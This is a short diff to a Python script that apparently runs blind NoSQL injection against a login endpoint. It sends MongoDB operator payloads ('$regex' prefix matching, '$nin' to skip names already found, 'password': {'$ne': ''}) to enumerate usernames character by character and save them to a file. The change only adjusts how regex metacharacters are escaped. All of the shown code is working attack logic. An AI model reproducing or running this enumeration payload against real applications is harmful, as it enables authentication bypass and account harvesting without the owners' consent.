@@ -39,13 +39,11 @@ def makeRequest(url, proxy_url=None, output_file="usernames.txt"):
             
         for character in characters:
             if character in '.^$*+?{}[]\\|()':
-                escaped_character = '\\' + character
-            else:
-                escaped_character = character
-                
+                character = '\\' + character
+
             data = {
                 'username': {
-                    '$regex': f'^{current_username}{escaped_character}',
+                    '$regex': f'^{current_username}{character}',
                     '$nin': usernames
                 },
                 'password': {'$ne': ''}
